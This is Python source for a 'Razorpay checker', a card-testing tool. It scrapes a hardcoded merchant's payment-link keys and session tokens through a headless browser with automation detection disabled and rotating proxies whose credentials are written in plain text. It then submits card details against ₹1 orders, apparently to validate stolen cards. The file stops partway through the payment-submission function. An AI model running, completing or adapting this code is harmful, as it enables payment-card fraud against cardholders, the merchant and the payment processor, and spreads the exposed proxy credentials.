# ============================================================
#   RAZORPAY CHECKER v5.5
#   Fixed: Merchant data extraction - robust multi-method approach
#   Fixed: Better wait times, network interception, HTML parsing
# ============================================================

import asyncio
import requests
import json
import time
import random
import re
import string
import logging
import platform
import threading
from multiprocessing import Process, Queue
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode, urlparse, parse_qs

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ==================== HARDCODED PROXIES ====================
PROXY_LIST = [
    "http://qpsiwsym:1d7x54ucvl3x@45.38.107.97:6014",
    "http://qpsiwsym:1d7x54ucvl3x@107.172.163.27:6543",
    "http://qpsiwsym:1d7x54ucvl3x@198.105.121.200:6462",   
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cl-san.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@rs-bel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@gr-ath.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pt-lis.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://qpsiwsym:1d7x54ucvl3x@31.59.20.176:6754",
    "http://qpsiwsym:1d7x54ucvl3x@23.95.150.145:6114",
    "http://qpsiwsym:1d7x54ucvl3x@198.23.239.134:6540",
    "http://qpsiwsym:1d7x54ucvl3x@216.10.27.159:6837",
    "http://qpsiwsym:1d7x54ucvl3x@142.111.67.146:5611",
    "http://qpsiwsym:1d7x54ucvl3x@191.96.254.138:6185",
    "http://qpsiwsym:1d7x54ucvl3x@31.58.9.4:6077",
    "http://g10701005:j0i2m2@proxy.ttu.edu.tw:3128",
    "http://spuqbkih:m0x2v6ozxa21@31.59.20.176:6754",
    "http://spuqbkih:m0x2v6ozxa21@23.95.150.145:6114",
    "http://spuqbkih:m0x2v6ozxa21@198.23.239.134:6540",
    "http://spuqbkih:m0x2v6ozxa21@45.38.107.97:6014",
    "http://spuqbkih:m0x2v6ozxa21@107.172.163.27:6543",
    "http://spuqbkih:m0x2v6ozxa21@198.105.121.200:6462",
    "http://spuqbkih:m0x2v6ozxa21@216.10.27.159:6837",
    "http://spuqbkih:m0x2v6ozxa21@142.111.67.146:5611",
    "http://spuqbkih:m0x2v6ozxa21@191.96.254.138:6185",
    "http://spuqbkih:m0x2v6ozxa21@31.58.9.4:6077"
]

HARDCODED_SITE = "https://razorpay.me/@yellowclass7719"
HARDCODED_AMOUNT_PAISE = 100  # ₹1
TDS_WAIT_SECONDS = 10
PROCESS_TIMEOUT = 90

# ==================== CACHED MERCHANT DATA ====================
_cached_merchant_data = None
_merchant_data_lock = None
_merchant_data_expiry = 0
MERCHANT_DATA_TTL = 300  # 5 minutes

# ==================== PROXY ROTATION STATE ====================
_proxy_index = 0
_proxy_async_lock = None
_proxy_thread_lock = threading.Lock()
_total_proxy_rotations = 0

# ==================== EXECUTOR ====================
_executor = None


def _get_executor():
    global _executor
    if _executor is None:
        _executor = ThreadPoolExecutor(max_workers=4)
    return _executor


def _sanitize_telegram(text):
    if not isinstance(text, str):
        return str(text)
    return text.replace('<', '').replace('>', '')


# ==================== PG_ROUTER RESPONSE DETECTION ====================

def _is_pg_router_response(data):
    if not isinstance(data, dict):
        return False
    amount = data.get("amount", "")
    notif_url = data.get("notificationUrl", "")
    if not isinstance(amount, str) or not isinstance(notif_url, str):
        return False
    has_rupee = "\u20b9" in amount or "₹" in amount
    has_pg_router = "pg_router/v1/payments" in notif_url
    return has_rupee and has_pg_router


def _auth_failed_response():
    return {
        "description": "Your payment could not be completed due to incorrect OTP or verification details. Try another payment method or contact your bank for details.",
        "reason": "authentication_failed"
    }


# ==================== PROXY FUNCTIONS ====================

def _parse_proxy_string(proxy_string):
    clean = proxy_string.replace('https://', '').replace('http://', '')
    if '@' not in clean:
        return None
    credentials, host_port = clean.split('@', 1)
    if ':' not in credentials or ':' not in host_port:
        return None
    user, pw = credentials.split(':', 1)
    ip, port = host_port.rsplit(':', 1)
    if not all([user, pw, ip, port]):
        return None
    return {
        'ip': ip,
        'port': port,
        'user': user,
        'password': pw,
        'proxy_reqs': {
            'http': f'http://{user}:{pw}@{ip}:{port}',
            'https': f'http://{user}:{pw}@{ip}:{port}'
        },
        'proxy_playwright': {
            'server': f'http://{ip}:{port}',
            'username': user,
            'password': pw
        }
    }


async def _get_next_proxy():
    global _proxy_index, _proxy_async_lock, _total_proxy_rotations
    if _proxy_async_lock is None:
        _proxy_async_lock = asyncio.Lock()
    async with _proxy_async_lock:
        proxy_str = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
        proxy_num = (_proxy_index % len(PROXY_LIST)) + 1
        _proxy_index += 1
        _total_proxy_rotations += 1
        if _total_proxy_rotations % 50 == 1:
            logging.info(f"[Razorpay] Proxy rotation: using proxy #{proxy_num}/{len(PROXY_LIST)}")
    return proxy_str


def _get_proxy_at_index(index):
    return PROXY_LIST[index % len(PROXY_LIST)]


def _get_random_proxy():
    return PROXY_LIST[random.randint(0, len(PROXY_LIST) - 1)]


# ==================== MERCHANT DATA EXTRACTION HELPERS ====================

def _extract_merchant_fields_from_data(data, depth=0):
    """Recursively extract keyless_header, key_id, payment_link_id, payment_page_item_id from data."""
    if not data or not isinstance(data, dict) or depth > 8:
        return None
    
    kh = None
    kid = None
    plid = None
    ppiid = None
    
    # Direct fields
    kh = data.get('keyless_header')
    kid = data.get('key_id')
    plid = data.get('payment_link_id') or data.get('id')
    
    # Get payment_page_item_id - multiple possible locations
    ppi_list = data.get('payment_page_items', [])
    if ppi_list and isinstance(ppi_list, list) and len(ppi_list) > 0:
        if isinstance(ppi_list[0], dict):
            ppiid = ppi_list[0].get('id')
    if not ppiid:
        ppiid = data.get('payment_page_item_id')
    
    # Check nested payment_link object
    pl = data.get('payment_link')
    if isinstance(pl, dict):
        kh = kh or pl.get('keyless_header')
        kid = kid or pl.get('key_id')
        plid = plid or pl.get('id') or pl.get('payment_link_id')
        ppi_nested = pl.get('payment_page_items', [])
        if ppi_nested and isinstance(ppi_nested, list) and len(ppi_nested) > 0:
            if isinstance(ppi_nested[0], dict):
                ppiid = ppiid or ppi_nested[0].get('id')
    
    # Check nested structures
    if not kh or not kid or not plid or not ppiid:
        for key in ['props', 'state', 'data', 'attributes', 'payment_link_data', 'pageProps', 'checkout']:
            nested = data.get(key)
            if isinstance(nested, dict):
                sub_result = _extract_merchant_fields_from_data(nested, depth + 1)
                if sub_result:
                    kh = kh or sub_result[0]
                    kid = kid or sub_result[1]
                    plid = plid or sub_result[2]
                    ppiid = ppiid or sub_result[3]
                    if kh and kid and plid and ppiid:
                        break
    
    if kh and kid and plid and ppiid:
        return (kh, kid, plid, ppiid)
    
    return None


def _extract_keyless_header_from_text(text):
    """Extract keyless_header - typically a long JWT-like token."""
    if not text:
        return None
    
    patterns = [
        r'keyless_header["\s:=]+["\']([A-Za-z0-9_\-.]+)["\']',
        r'"keyless_header"\s*:\s*"([^"]+)"',
        r"'keyless_header'\s*:\s*'([^']+)'",
        r'keyless_header\s*=\s*["\']([^"\']+)["\']',
        r'keylessHeader["\s:=]+["\']([A-Za-z0-9_\-.]+)["\']',
        r'"keylessHeader"\s*:\s*"([^"]+)"',
    ]
    
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            value = m.group(1)
            if len(value) > 50:  # JWT-like tokens are long
                return value
    
    return None


def _extract_key_id_from_text(text):
    """Extract key_id - starts with rzp_"""
    if not text:
        return None
    
    patterns = [
        r'["\']key_id["\']\s*:\s*["\']([^"\']+)["\']',
        r'"key"\s*:\s*"([^"]+)"',
        r'key_id\s*:\s*["\']([^"\']+)["\']',
        r'key\s*:\s*["\']rzp_[^"\']+["\']',
    ]
    
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            value = m.group(1)
            if 'rzp_' in value:
                return value
    
    return None


def _extract_payment_link_id_from_text(text):
    """Extract payment_link_id - starts with plink_"""
    if not text:
        return None
    
    patterns = [
        r'["\']payment_link_id["\']\s*:\s*["\']([^"\']+)["\']',
        r'payment_link_id\s*:\s*["\']([^"\']+)["\']',
    ]
    
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            return m.group(1)
    
    return None


def _extract_payment_page_item_id_from_text(text):
    """Extract payment_page_item_id - starts with ppi_"""
    if not text:
        return None
    
    patterns = [
        r'["\']payment_page_item_id["\']\s*:\s*["\']([^"\']+)["\']',
        r'payment_page_item_id\s*:\s*["\']([^"\']+)["\']',
    ]
    
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            return m.group(1)
    
    return None


def _extract_merchant_from_text(text):
    """Extract all merchant fields from text using regex."""
    if not text:
        return None
    
    kh = _extract_keyless_header_from_text(text)
    kid = _extract_key_id_from_text(text)
    plid = _extract_payment_link_id_from_text(text)
    ppiid = _extract_payment_page_item_id_from_text(text)
    
    if kh and kid and plid and ppiid:
        return (kh, kid, plid, ppiid)
    
    return None


def _extract_merchant_from_html(html):
    """Extract merchant data from HTML by parsing script tags."""
    if not html:
        return None
    
    # Find all script tags
    script_pattern = r'<script[^>]*>([\s\S]*?)</script>'
    scripts = re.findall(script_pattern, html, re.IGNORECASE)
    
    for script in scripts:
        # Skip empty scripts
        script = script.strip()
        if not script or len(script) < 50:
            continue
        
        # Try extraction from each script
        result = _extract_merchant_from_text(script)
        if result:
            logging.debug("[Razorpay] Merchant data from HTML script tag")
            return result
    
    return None


# ==================== MERCHANT DATA EXTRACTION - MAIN ====================

def _extract_merchant_data_with_proxy(proxy_data):
    """Comprehensive merchant data extraction with multiple methods."""
    if not PLAYWRIGHT_AVAILABLE:
        return None, None, None, None, "Playwright not installed"
    
    site_url = HARDCODED_SITE
    proxy_config = proxy_data['proxy_playwright']
    proxy_reqs = proxy_data['proxy_reqs']
    
    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
    merchant_handle = merchant_match.group(1) if merchant_match else None
    
    for attempt in range(4):
        all_intercepted = []
        page_content = ""
        browser = None
        page_url_after = ""
        page_title = ""
        
        try:
            with sync_playwright() as p:
                browser_args = [
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-web-security',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-features=IsolateOrigins,site-per-process'
                ]
                if platform.system() == 'Linux':
                    browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
                
                browser = p.chromium.launch(
                    headless=True,
                    proxy=proxy_config,
                    args=browser_args,
                    timeout=25000
                )
                
                context = browser.new_context(
                    ignore_https_errors=True,
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    viewport={'width': 1366, 'height': 768}
                )
                page = context.new_page()

                # Intercept ALL responses from razorpay domains
                def on_resp(r):
                    try:
                        url = r.url
                        # Only intercept razorpay API responses
                        if 'api.razorpay.com' in url or 'razorpay.me/api' in url:
                            ct = r.headers.get('content-type', '')
                            if 'json' in ct.lower() or 'javascript' in ct.lower():
                                try:
                                    data = r.json()
                                    if data and isinstance(data, dict):
                                        all_intercepted.append({'url': url, 'data': data})
                                except:
                                    pass
                    except:
                        pass

                page.on("response", on_resp)
                
                # Navigate to page with longer timeout
                try:
                    page.goto(site_url, timeout=25000, wait_until='domcontentloaded')
                    # Wait for network to settle - API calls happen after page load
                    page.wait_for_timeout(6000)
                except Exception as nav_err:
                    logging.debug(f"[Razorpay] Nav attempt {attempt+1}: {str(nav_err)[:100]}")
                    try:
                        page.wait_for_timeout(4000)
                    except:
                        pass
                
                try:
                    page_url_after = page.url
                    page_title = page.title()
                except:
                    pass
                
                # Log navigation result for debugging
                logging.debug(f"[Razorpay] Attempt {attempt+1}: URL={page_url_after[:80]}, Title={page_title[:50]}")
                
                # Check for obvious failures
                if 'error' in page_title.lower() or 'access denied' in page_title.lower():
                    logging.warning(f"[Razorpay] Page blocked/error: {page_title}")
                
                # ==================== METHOD 1: Intercepted API responses ====================
                for item in all_intercepted:
                    data = item['data']
                    result = _extract_merchant_fields_from_data(data)
                    if result:
                        logging.info(f"[Razorpay] Merchant data from API intercept: {item['url'][:60]}")
                        try:
                            browser.close()
                        except:
                            pass
                        return result + (None,)
                
                logging.debug(f"[Razorpay] Intercepted {len(all_intercepted)} API responses, none had merchant data")
                
                # ==================== METHOD 2: JavaScript evaluation ====================
                try:
                    eval_result = page.evaluate("""() => {
                        // Check many possible window variables
                        const vars = [
                            'data', '__INITIAL_STATE__', '__CHECKOUT_DATA__', 
                            'razorpayData', '__NEXT_DATA__', 'checkoutOptions',
                            'paymentLinkData', 'pageData', 'APP_DATA',
                            '__APP_DATA__', '__RAZORPAY_DATA__', 'rzpCheckoutData',
                            'window.checkoutOptions', 'window.razorpayCheckoutOptions'
                        ];
                        
                        for (const v of vars) {
                            try {
                                let d;
                                if (v.startsWith('window.')) {
                                    d = eval(v);
                                } else {
                                    d = window[v];
                                }
                                if (!d || typeof d !== 'object') continue;
                                
                                // Direct check
                                if (d.keyless_header) return {found: true, source: v, data: d};
                                if (d.key_id && d.payment_link_id) return {found: true, source: v, data: d};
                                
                                // Nested in props (Next.js pattern)
                                if (d.props?.pageProps) {
                                    const pp = d.props.pageProps;
                                    if (pp.keyless_header || (pp.key_id && pp.payment_link_id)) {
                                        return {found: true, source: v + '.props.pageProps', data: pp};
                                    }
                                }
                                
                                // Nested in state (Redux pattern)
                                if (d.state?.paymentLink) {
                                    const pl = d.state.paymentLink;
                                    if (pl.keyless_header || (pl.key_id && pl.payment_link_id)) {
                                        return {found: true, source: v + '.state.paymentLink', data: pl};
                                    }
                                }
                                
                                // Deep search for keyless_header
                                const deepSearch = (obj, maxDepth = 6) => {
                                    if (maxDepth <= 0 || !obj || typeof obj !== 'object') return null;
                                    if (obj.keyless_header && typeof obj.keyless_header === 'string' && obj.keyless_header.length > 50) {
                                        return obj;
                                    }
                                    for (const k in obj) {
                                        try {
                                            const r = deepSearch(obj[k], maxDepth - 1);
                                            if (r) return r;
                                        } catch(e) {}
                                    }
                                    return null;
                                };
                                const deep = deepSearch(d);
                                if (deep) return {found: true, source: v + ' (deep)', data: deep};
                            } catch(e) {}
                        }
                        
                        // Check Razorpay global object
                        try {
                            if (window.Razorpay?.options?.key) {
                                return {found: true, source: 'Razorpay.options', data: window.Razorpay.options};
                            }
                            if (window.rzp?.options?.key) {
                                return {found: true, source: 'rzp.options', data: window.rzp.options};
                            }
                        } catch(e) {}
                        
                        // Check data attributes on elements
                        try {
                            const el = document.querySelector('[data-options], [data-checkout], [data-razorpay]');
                            if (el) {
                                for (const attr of ['data-options', 'data-checkout', 'data-razorpay']) {
                                    const val = el.getAttribute(attr);
                                    if (val) {
                                        try {
                                            const parsed = JSON.parse(val);
                                            if (parsed.key_id || parsed.keyless_header) {
                                                return {found: true, source: attr, data: parsed};
                                            }
                                        } catch(e) {}
                                    }
                                }
                            }
                        } catch(e) {}
                        
                        return {found: false};
                    }""")
                    
                    if eval_result and eval_result.get('found'):
                        result = _extract_merchant_fields_from_data(eval_result['data'])
                        if result:
                            logging.info(f"[Razorpay] Merchant data from JS: {eval_result.get('source', 'unknown')}")
                            try:
                                browser.close()
                            except:
                                pass
                            return result + (None,)
                    
                except Exception as e:
                    logging.debug(f"[Razorpay] JS eval error: {str(e)[:100]}")
                
                # ==================== METHOD 3: Parse HTML directly ====================
                try:
                    page_content = page.content()
                except:
                    pass
                
                if page_content:
                    result = _extract_merchant_from_html(page_content)
                    if result:
                        logging.info("[Razorpay] Merchant data from HTML parsing")
                        try:
                            browser.close()
                        except:
                            pass
                        return result + (None,)
                    
                    # Also try to find just keyless_header in full HTML
                    kh = _extract_keyless_header_from_text(page_content)
                    if kh:
                        logging.debug(f"[Razorpay] Found keyless_header in HTML but missing other fields: {kh[:30]}...")
                
                try:
                    browser.close()
                except:
                    pass
                
        except Exception as e:
            logging.debug(f"[Razorpay] Merchant attempt {attempt+1} exception: {str(e)[:100]}")
            try:
                if browser:
                    browser.close()
            except:
                pass
            continue
    
    # ==================== METHOD 4: Direct API calls with multiple proxies ====================
    if merchant_handle:
        logging.info("[Razorpay] Trying direct API calls for merchant data...")
        
        api_endpoints = [
            f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}",
        ]
        
        for api_attempt in range(3):
            # Try different proxies
            if api_attempt == 0:
                current_proxy_reqs = proxy_reqs
            else:
                fallback_str = _get_random_proxy()
                fallback_data = _parse_proxy_string(fallback_str)
                if not fallback_data:
                    continue
                current_proxy_reqs = fallback_data['proxy_reqs']
            
            for api_url in api_endpoints:
                try:
                    response = requests.get(api_url, timeout=15, proxies=current_proxy_reqs, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "application/json",
                        "Origin": "https://razorpay.me",
                        "Referer": site_url,
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-site"
                    })
                    
                    logging.debug(f"[Razorpay] API {api_url}: status={response.status_code}")
                    
                    if response.status_code == 200:
                        data = response.json()
                        result = _extract_merchant_fields_from_data(data)
                        if result:
                            logging.info(f"[Razorpay] Merchant data from direct API")
                            return result + (None,)
                        # Log what we got for debugging
                        logging.debug(f"[Razorpay] API response keys: {list(data.keys()) if isinstance(data, dict) else type(data)}")
                    elif response.status_code == 404:
                        logging.debug("[Razorpay] API endpoint 404 - might not exist")
                        break  # Don't retry this endpoint
                except Exception as e:
                    logging.debug(f"[Razorpay] API call error: {str(e)[:80]}")
    
    # ==================== METHOD 5: Fetch page HTML with requests and parse ====================
    logging.info("[Razorpay] Trying HTTP fetch for merchant data...")
    
    for http_attempt in range(2):
        if http_attempt == 0:
            http_proxy = proxy_reqs
        else:
            fallback_str = _get_random_proxy()
            fallback_data = _parse_proxy_string(fallback_str)
            if not fallback_data:
                continue
            http_proxy = fallback_data['proxy_reqs']
        
        try:
            resp = requests.get(site_url, timeout=20, proxies=http_proxy, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Upgrade-Insecure-Requests": "1"
            })
            
            if resp.status_code == 200:
                result = _extract_merchant_from_html(resp.text)
                if result:
                    logging.info("[Razorpay] Merchant data from HTTP HTML fetch")
                    return result + (None,)
                
                # Debug: log what we found
                kh = _extract_keyless_header_from_text(resp.text)
                kid = _extract_key_id_from_text(resp.text)
                logging.debug(f"[Razorpay] HTTP fetch: kh={'found' if kh else 'missing'}, kid={'found' if kid else 'missing'}")
        except Exception as e:
            logging.debug(f"[Razorpay] HTTP fetch error: {str(e)[:80]}")
    
    return None, None, None, None, "All merchant extraction methods failed"


# ==================== ASYNC MERCHANT DATA CACHE ====================

async def _ensure_merchant_data():
    global _cached_merchant_data, _merchant_data_lock, _merchant_data_expiry
    
    now = time.time()
    if _cached_merchant_data and now < _merchant_data_expiry:
        return _cached_merchant_data
    
    if _merchant_data_lock is None:
        _merchant_data_lock = asyncio.Lock()
    
    async with _merchant_data_lock:
        now = time.time()
        if _cached_merchant_data and now < _merchant_data_expiry:
            return _cached_merchant_data
        
        logging.info("[Razorpay] Extracting merchant data (cache miss)...")
        
        # Try with multiple proxies
        for attempt in range(5):
            proxy_string = _get_proxy_at_index(_proxy_index + attempt)
            proxy_data = _parse_proxy_string(proxy_string)
            if not proxy_data:
                continue
            
            try:
                loop = asyncio.get_running_loop()
                kh, kid, plid, ppiid, err = await loop.run_in_executor(
                    _get_executor(),
                    _extract_merchant_data_with_proxy,
                    proxy_data
                )
                
                if not err and kh and kid and plid and ppiid:
                    _cached_merchant_data = {
                        'kh': kh, 'kid': kid, 'plid': plid, 'ppiid': ppiid
                    }
                    _merchant_data_expiry = now + MERCHANT_DATA_TTL
                    logging.info(f"[Razorpay] ✓ Merchant data cached: kid={kid[:15]}... plid={plid[:15]}...")
                    return _cached_merchant_data
                else:
                    logging.warning(f"[Razorpay] Merchant attempt {attempt+1}/5 failed: {err}")
            except Exception as e:
                logging.error(f"[Razorpay] Merchant attempt {attempt+1}/5 exception: {e}")
        
        # Return stale cache if available
        if _cached_merchant_data:
            logging.warning("[Razorpay] Using stale merchant cache as fallback")
            _merchant_data_expiry = now + 30
            return _cached_merchant_data
        
        raise Exception("Failed to extract merchant data after 5 attempts with different proxies")


def _invalidate_merchant_cache():
    global _cached_merchant_data, _merchant_data_expiry
    _cached_merchant_data = None
    _merchant_data_expiry = 0


# ==================== SESSION TOKEN METHODS ====================

def _extract_token_from_url(url):
    if not url:
        return None
    try:
        token = parse_qs(urlparse(url).query).get("session_token", [None])[0]
        if token and len(token) > 10:
            return token
    except:
        pass
    return None


def _extract_token_from_text(text):
    if not text:
        return None
    patterns = [
        r'session_token["\s:=]+([a-zA-Z0-9_-]{20,})',
        r'session_token=([a-zA-Z0-9_-]{20,})',
        r'"session_token"\s*:\s*"([^"]{20,})"',
        r"'session_token'\s*:\s*'([^']{20,})'",
    ]
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            return m.group(1)
    return None


def _get_session_token_http_only(proxy_reqs):
    urls_to_try = [
        "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
        "https://api.razorpay.com/v1/checkout/public?new_session=true",
        "https://api.razorpay.com/v1/checkout/public?traffic_env=production",
    ]
    
    for url in urls_to_try:
        try:
            s = requests.Session()
            if proxy_reqs:
                s.proxies.update(proxy_reqs)
            s.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            })
            
            resp = s.get(url, timeout=15, allow_redirects=True)
            
            token = _extract_token_from_url(resp.url)
            if token:
                return token, None
            
            if resp.history:
                for r in resp.history:
                    loc = r.headers.get('Location', '')
                    token = _extract_token_from_url(loc)
                    if token:
                        return token, None
            
            token = _extract_token_from_text(resp.text)
            if token:
                return token, None
            
            try:
                data = resp.json()
                token = data.get("session_token")
                if token and len(str(token)) > 10:
                    return str(token), None
            except:
                pass
            
        except Exception as e:
            continue
    
    return None, "HTTP-only failed"


def _get_session_token_with_playwright(proxy_data):
    if not PLAYWRIGHT_AVAILABLE:
        return None, "Playwright not installed"
    
    proxy_config = proxy_data['proxy_playwright']
    
    for attempt in range(2):
        all_urls = []
        browser = None
        
        try:
            with sync_playwright() as p:
                browser_args = [
                    '--no-sandbox', '--disable-dev-shm-usage',
                    '--disable-web-security', '--disable-blink-features=AutomationControlled'
                ]
                if platform.system() == 'Linux':
                    browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
                
                browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args, timeout=20000)
                context = browser.new_context(ignore_https_errors=True, user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                page = context.new_page()
                
                def on_request(request):
                    all_urls.append(request.url)
                def on_response(response):
                    all_urls.append(response.url)
                
                page.on("request", on_request)
                page.on("response", on_response)
                
                try:
                    page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=15000, wait_until='commit')
                except:
                    pass
                
                try:
                    page.wait_for_timeout(5000)
                except:
                    pass
                
                try:
                    token = _extract_token_from_url(page.url)
                    if token:
                        browser.close()
                        return token, None
                except:
                    pass
                
                for captured_url in all_urls:
                    token = _extract_token_from_url(captured_url)
                    if token:
                        browser.close()
                        return token, None
                
                try:
                    js_result = page.evaluate("""() => {
                        const params = new URLSearchParams(window.location.search);
                        if (params.get('session_token')) return params.get('session_token');
                        if (window.session_token) return window.session_token;
                        const scripts = document.querySelectorAll('script');
                        for (const s of scripts) {
                            const m = (s.textContent || '').match(/session_token["\\s:=]+([a-zA-Z0-9_-]{20,})/);
                            if (m) return m[1];
                        }
                        return null;
                    }""")
                    if js_result and len(str(js_result)) > 10:
                        browser.close()
                        return str(js_result), None
                except:
                    pass
                
                browser.close()
                    
        except Exception as e:
            try:
                if browser:
                    browser.close()
            except:
                pass
    
    return None, "Playwright failed"


def _get_session_token_robust(proxy_data, proxy_reqs):
    token, err = _get_session_token_http_only(proxy_reqs)
    if token:
        return token, None
    
    token, err = _get_session_token_with_playwright(proxy_data)
    if token:
        return token, None
    
    for fallback_attempt in range(2):
        fallback_proxy_str = _get_random_proxy()
        fallback_data = _parse_proxy_string(fallback_proxy_str)
        if not fallback_data:
            continue
        
        token, err = _get_session_token_http_only(fallback_data['proxy_reqs'])
        if token:
            return token, None
    
    return None, "All token methods failed"


# ==================== PAYMENT FUNCTIONS ====================

def _random_user_info():
    return {
        "name": "Test User",
        "email": f"testuser{random.randint(100, 999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }


def _create_order(session, payment_link_id, amount_paise, payment_page_item_id, session_token=None, keyless_header=None):
    base_headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://razorpay.com",
        "Referer": HARDCODED_SITE,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    
    if session_token:
        base_headers["x-session-token"] = session_token
    if keyless_header:
        base_headers["keyless-header"] = keyless_header
    
    payloads = [
        {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]},
        {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}], "currency": "INR"},
        {"line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]},
    ]
    
    endpoints = [
        f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order",
        f"https://api.razorpay.com/v1/payment_links/{payment_link_id}/order",
    ]
    
    for endpoint in endpoints:
        for payload in payloads:
            try:
                resp = session.post(endpoint, headers=base_headers, json=payload, timeout=12)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        order_id = data.get("order", {}).get("id") or data.get("id") or data.get("order_id")
                        if order_id:
                            return order_id
                    except json.JSONDecodeError:
                        pass
                
                if resp.status_code == 429:
                    time.sleep(float(resp.headers.get('Retry-After', '2')))
                    continue
                
                if resp.status_code in [401, 403]:
                    continue
                
                if resp.status_code == 400:
                    try:
                        err_code = resp.json().get("error", {}).get("code", "")
                        if err_code in ["BAD_REQUEST_ERROR", "INVALID_LINK"]:
                            return None
                    except:
                        pass
                    continue
                
                if resp.status_code == 404:
                    break
                
                if resp.status_code >= 500:
                    time.sleep(1)
                    continue
                    
            except requests.exceptions.RequestException:
                continue
    
    return None


def _submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {
        "x-session-token": session_token,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": "https://razorpay.com",
